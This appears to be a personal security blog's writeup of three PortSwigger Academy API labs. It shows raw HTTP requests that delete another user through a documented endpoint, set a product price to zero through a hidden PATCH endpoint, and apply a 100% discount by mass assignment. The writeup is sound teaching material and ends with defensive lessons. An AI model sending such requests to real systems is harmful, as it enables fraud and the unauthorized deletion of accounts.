@@ -1,0 +1,203 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>PortSwigger API Labs Writeup - GhostFlagged Blog</title>
+  <link rel="stylesheet" href="../style.css">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+</head>
+<body>
+  <div class="container">
+    <!-- Sidebar -->
+    <aside class="sidebar">
+      <div class="profile-section">
+        <div class="profile-pic">
+          <img src="../033c6a1e8ca3ad18b0e6ac169604c66b.jpg" alt="Profile Picture" id="profile-img">
+        </div>
+        <h1>GhostFlagged</h1>
+        <p class="tagline">My personal space for writing and sharing ideas.</p>
+      </div>
+      
+      <div class="bio-section">
+        <h3>Bio</h3>
+        <p>Security researcher and CTF enthusiast. Passionate about web application security, vulnerability research, and sharing knowledge through writeups and tools.</p>
+      </div>
+      
+      <div class="contact-section">
+        <h3>Contact</h3>
+        <a href="mailto:your.email@example.com" class="email-link">your.email@example.com</a>
+      </div>
+
+      <nav class="sidebar-nav">
+        <a href="../index.html#posts" class="nav-link">Posts</a>
+      </nav>
+
+      <footer class="sidebar-footer">
+        <p>&copy; 2025 GhostFlagged</p>
+      </footer>
+    </aside>
+
+    <!-- Main Content -->
+    <main class="main-content">
+      <article class="post-content">
+        <div class="post-title-header">
+          <span class="post-category category-ctf">CTF</span>
+          <h1>PortSwigger API Labs Writeup</h1>
+        </div>
+        <p class="post-meta">Published on January 2025</p>
+        <a href="../index.html" class="back-link">← Back to Home</a>
+        <div class="post-body">
+          <p>This post covers three PortSwigger Web Security Academy labs focused on API testing and exploitation. These are great practice for understanding how real-world APIs can be abused when documentation, unused endpoints, or mass assignment vulnerabilities are exposed.</p>
+
+          <h2>Lab 1 — Exploiting an API Endpoint Using Documentation</h2>
+          
+          <p>Lab: <a href="https://portswigger.net/web-security/api-testing/lab-exploiting-api-endpoint-using-documentation" target="_blank" rel="noopener">Exploiting an API endpoint using documentation</a></p>
+
+          <p><strong>Approach.</strong> I started by opening Burp Suite, intercepting traffic, and logging in with the provided credentials <code>wiener:peter</code>. The goal was to explore the application and discover any API documentation endpoints (Swagger/OpenAPI).</p>
+
+          <p>Common documentation paths I looked for included:</p>
+
+          <pre class="code-block"><code>swagger.json
+openapi.json
+swagger.yaml
+openapi.yaml</code></pre>
+
+          <p>After testing these paths, I found an OpenAPI document at <code>/api/openapi.json</code>:</p>
+
+          <pre class="code-block"><code>{"openapi":"3.0.0","info":{"version":"v0.1","title":"We Love To Shop API (REST API)"},"servers":[{"url":"./"}],"paths":{"/user/{user.username}":{"get":{"parameters":[{"name":"user.username","in":"path","required":true,"schema":{"type":"string"}}],"responses":{"200":{"description":"user","content":{"application/json":{"schema":{"type":"object","$ref":"#/components/schemas/User"}}}},"default":{"description":"Error","content":{"application/json":{"schema":{"type":"object","$ref":"#/components/schemas/Error"}}}}}},"delete":{"parameters":[{"name":"user.username","in":"path","required":true,"schema":{"type":"string"}}],"responses":{"200":{"description":"user","content":{"application/json":{"schema":{"type":"object","$ref":"#/components/schemas/Result"}}}},"default":{"description":"Error","content":{"application/json":{"schema":{"type":"object","$ref":"#/components/schemas/Error"}}}}}},"patch":{"parameters":[{"name":"user.username","in":"path","required":true,"schema":{"type":"string"}}],"requestBody":{"content":{"application/json":{"schema":{"type":"string"}}}},"responses":{"200":{"description":"user","content":{"application/json":{"schema":{"type":"object","$ref":"#/components/schemas/User"}}}},"default":{"description":"Error","content":{"application/json":{"schema":{"type":"object","$ref":"#/components/schemas/Error"}}}}}}}},"components":{"schemas":{"Error":{"oneOf":[{"$ref":"#/components/schemas/ServerError"},{"$ref":"#/components/schemas/ClientError"}],"discriminator":{"propertyName":"type"}},"ClientError":{"type":"object","required":["error"],"properties":{"code":{"type":"integer","format":"int32"},"error":{"type":"string"}}},"Result":{"type":"object","required":["status"],"properties":{"status":{"type":"string"}}},"ServerError":{"type":"object","required":["error"],"properties":{"code":{"type":"integer","format":"int32"},"error":{"type":"string"}}},"User":{"type":"object","required":["username","email"],"properties":{"username":{"type":"string"},"email":{"type":"string"}}}}}}</code></pre>
+
+          <p>This documentation showed a <code>/user/{user.username}</code> endpoint that supported <code>GET</code>, <code>DELETE</code>, and <code>PATCH</code>. The lab's goal was to delete another user, so the <code>DELETE</code> method was the obvious target.</p>
+
+          <p><strong>Exploitation.</strong> Using the documentation, I crafted a <code>DELETE</code> request to remove the target user <code>carlos</code>:</p>
+
+          <pre class="code-block"><code>DELETE /api/user/carlos HTTP/2
+Host: [LAB_HOST]
+Cookie: session=[LAB_SESSION_COOKIE]
+Content-Length: 0
+Sec-Ch-Ua-Platform: "macOS"
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
+Sec-Ch-Ua: "Chromium";v="142", "Google Chrome";v="142", "Not_A Brand";v="99"
+Content-Type: text/plain;charset=UTF-8
+Sec-Ch-Ua-Mobile: ?0
+Accept: */*
+Origin: https://[LAB_HOST]
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: https://[LAB_HOST]/my-account
+Accept-Encoding: gzip, deflate, br
+Accept-Language: en-US,en;q=0.9
+Priority: u=1, i</code></pre>
+
+          <p>After sending this request, the lab confirmed that the user <code>carlos</code> had been deleted, completing the challenge.</p>
+
+          <h2>Lab 2 — Finding and Exploiting an Unused API Endpoint</h2>
+          
+          <p>Lab: <a href="https://portswigger.net/web-security/api-testing/lab-finding-and-exploiting-an-unused-api-endpoint" target="_blank" rel="noopener">Finding and exploiting an unused API endpoint</a></p>
+
+          <p><strong>Approach.</strong> For this lab, I again set up Burp Suite, logged into the account, and added a jacket to the cart. While interacting with the application, I monitored the API traffic and looked for endpoints related to pricing or products. The goal was to find an unused or hidden API endpoint that could be abused to manipulate the price of a product.</p>
+
+          <p><strong>Exploitation.</strong> I found a <code>PATCH</code> endpoint that allowed updating the price of a product:</p>
+
+          <pre class="code-block"><code>PATCH /api/products/1/price HTTP/2
+Host: [LAB_HOST]
+Cookie: session=[LAB_SESSION_COOKIE]
+Sec-Ch-Ua-Platform: "macOS"
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
+Sec-Ch-Ua: "Chromium";v="142", "Google Chrome";v="142", "Not_A Brand";v="99"
+Sec-Ch-Ua-Mobile: ?0
+Accept: */*
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: https://[LAB_HOST]/product?productId=1
+Accept-Encoding: gzip, deflate, br
+Accept-Language: en-US,en;q=0.9
+Priority: u=1, i
+Content-Length: 75
+Content-Type: application/json
+
+{"price":0,"message":"This item is in high demand - 11 purchased recently"}</code></pre>
+
+          <p>The key points here were:</p>
+          <ul>
+            <li>Using <code>PATCH</code> instead of <code>GET</code> or <code>POST</code></li>
+            <li>Setting a valid <code>Content-Type: application/json</code></li>
+            <li>Updating the <code>price</code> field to <code>0</code></li>
+          </ul>
+
+          <p>After sending this request, the product price was updated to zero, allowing me to complete the purchase for free and solve the lab.</p>
+
+          <h2>Lab 3 — Exploiting a Mass Assignment Vulnerability</h2>
+          
+          <p>Lab: <a href="https://portswigger.net/web-security/api-testing/lab-exploiting-a-mass-assignment-vulnerability" target="_blank" rel="noopener">Exploiting a mass assignment vulnerability</a></p>
+
+          <p><strong>Approach.</strong> Mass assignment vulnerabilities occur when an API directly maps JSON input to internal objects without proper filtering or validation. In this lab, the goal was to manipulate the checkout process by modifying fields that weren't intended to be user-controllable.</p>
+
+          <p>After setting up Burp Suite and logging in, I added the jacket to the cart and looked for checkout-related API calls. I found this request:</p>
+
+          <pre class="code-block"><code>GET /api/checkout HTTP/2
+Host: [LAB_HOST]
+Cookie: session=[LAB_SESSION_COOKIE]
+Sec-Ch-Ua-Platform: "macOS"
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
+Sec-Ch-Ua: "Chromium";v="142", "Google Chrome";v="142", "Not_A Brand";v="99"
+Sec-Ch-Ua-Mobile: ?0
+Accept: */*
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: https://[LAB_HOST]/cart
+Accept-Encoding: gzip, deflate, br
+Accept-Language: en-US,en;q=0.9
+Priority: u=1, i</code></pre>
+
+          <p>The response looked like this:</p>
+
+          <pre class="code-block"><code>HTTP/2 200 OK
+Content-Type: application/json; charset=utf-8
+X-Content-Type-Options: nosniff
+X-Frame-Options: SAMEORIGIN
+Content-Length: 153
+
+{"chosen_discount":{"percentage":0},"chosen_products":[{"product_id":"1","name":"Lightweight \"l33t\" Leather Jacket","quantity":1,"item_price":133700}]}</code></pre>
+
+          <p><strong>Exploitation.</strong> To test for mass assignment, I copied the JSON response and used it as the body of a request to the appropriate checkout endpoint. I then tried modifying different fields.</p>
+
+          <p>Changing <code>item_price</code> directly didn't work, but modifying the <code>percentage</code> field in <code>chosen_discount</code> to <code>100</code> did:</p>
+
+          <pre class="code-block"><code>{
+  "chosen_discount": {
+    "percentage": 100
+  },
+  "chosen_products": [
+    {
+      "product_id": "1",
+      "name": "Lightweight \"l33t\" Leather Jacket",
+      "quantity": 1,
+      "item_price": 133700
+    }
+  ]
+}</code></pre>
+
+          <p>By sending this modified JSON, the application applied a 100% discount, reducing the total cost to zero and completing the lab.</p>
+
+          <h2>Key Takeaways</h2>
+          
+          <ul>
+            <li><strong>API Documentation:</strong> Public or semi-hidden OpenAPI/Swagger docs can reveal powerful endpoints like <code>DELETE</code> and <code>PATCH</code></li>
+            <li><strong>Unused Endpoints:</strong> Endpoints not directly used by the frontend can still be abused if left exposed</li>
+            <li><strong>Mass Assignment:</strong> Mapping raw JSON input directly to internal objects without filtering is dangerous</li>
+            <li><strong>Content-Type Matters:</strong> Many APIs behave differently depending on the <code>Content-Type</code> header</li>
+            <li><strong>Burp Suite Workflow:</strong> Intercept, explore, modify, and replay requests to discover hidden functionality</li>
+            <li><strong>Defense:</strong> Lock down HTTP methods, validate input, and avoid exposing unnecessary endpoints or documentation in production</li>
+          </ul>
+        </div>
+      </article>
+    </main>
+  </div>
+</body>
+<!-- duplicate content removed -->
